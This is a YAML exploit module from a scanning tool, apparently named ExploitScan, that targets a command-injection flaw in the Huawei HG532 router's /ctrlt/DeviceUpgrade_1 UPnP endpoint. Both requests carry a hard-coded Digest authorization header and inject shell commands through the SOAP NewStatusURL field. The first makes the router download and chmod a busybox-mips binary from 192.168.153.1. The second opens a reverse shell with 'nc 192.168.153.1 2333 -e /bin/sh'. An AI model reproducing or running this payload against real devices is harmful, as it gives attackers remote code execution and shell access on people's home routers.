ExploitScan/Modules/exps/iot/huaweihg532-rce.yml

name: huaweihg532-rce
set:
  rand: randomInt(200000000, 210000000)
groups:
  exp1:
    - method: POST
      path: /ctrlt/DeviceUpgrade_1
      headers:
        Content-Type: application/x-www-form-urlencoded
        Authorization: "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"
      body: <?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>http://$(/usr/bin/wget -g -l /tmp/busybox-mips -r /busybox-mips 192.168.153.1; chmod 755 /tmp/busybox-mips;)</NewStatusURL><NewDownloadURL>;echo 2;</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
      expression: |
        response.status == 200 && response.body.bcontains(b"<?xml version=\"1.0\"?>")
  exp2:
    - method: POST
      path: /ctrlt/DeviceUpgrade_1
      headers:
        Content-Type: application/x-www-form-urlencoded
        Authorization: "Digest username=dslf-config, realm=HuaweiHomeGateway, nonce=88645cefb1f9ede0e336e3569d75ee30, uri=/ctrlt/DeviceUpgrade_1, response=3612f843a42db38f48f59d2a3597e19c, algorithm=MD5, qop=auth, nc=00000001, cnonce=248d1a2560100669"
      body: <?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1"><NewStatusURL>http://$(/tmp/busybox-mips nc 192.168.153.1 2333 -e /bin/sh)</NewStatusURL><NewDownloadURL>;echo 1;</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>
      expression: |
        response.status == 200 && response.body.bcontains(b"<?xml version=\"1.0\"?>")